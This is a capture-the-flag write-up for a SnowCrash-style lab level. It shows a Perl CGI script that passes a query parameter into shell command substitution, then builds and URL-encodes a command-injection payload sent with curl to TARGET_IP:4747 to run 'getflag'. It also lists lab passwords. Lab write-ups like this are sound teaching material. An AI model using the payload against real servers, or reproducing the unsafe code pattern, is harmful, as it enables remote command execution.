# LEVEL 04

> [!TIP]
> user: `level04` <br>
> pass: `qi0maab88jeaj46qoumi7maus`

## STEP 01

In the home folder of the **level04**, the is a **[level04.pl](https://github.com/Pixailz/SnowCrash/blob/main/level04/resources/level04.pl)**
script that have SUID bit set, and belong to the **flag04**

Retrieve it simply by doing
```bash
cat level04.pl
##!/usr/bin/perl
## localhost:4747
#use CGI qw{param};
#print "Content-type: text/html\n\n";
#sub x {
#  $y = $_[0];
#  print `echo $y 2>&1`;
#}
#x(param("x"));
```

> [!NOTE]
> The security issue could be that the `print` function take a command
> substitution as argument, that itself take an input that the user control via
> the query parameter **x**

> [!TIP]
> Checking that a server is listening on the port mentionned in the script,
> could be done with a `ss -l | grep 4747`

## STEP 02

So, with `echo $y 2>&1` as command substitution, we can craft a payload, using
CyberChef, to make the server execute the `getflag` command

```
Unencoded payload:

'-n ; getflag #'
 ┬─ ┬ ┬────── ┬
 │  │ │       └ 4. the comment to make all the end disappear
 │  │ └──────── 3. the injected command
 │  └────────── 2. separator to chain the command
 └───────────── 1. is the flag to prevent echo from outputing a newline, this it
                   completly disable the echo command. optional
```

> encoded payload (with [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)&input=LW4gOyBnZXRmbGFnICM))
**%2Dn%20%3B%20getflag%20%23**

> [!TIP]
> to get the flag, you could simply do
> `curl http://TARGET_IP:4747/?x=%2Dn%20%3B%20getflag%20%23`

> [!IMPORTANT]
> the password for the next level is `ne2searoevaevoem4ov4ar8ap`
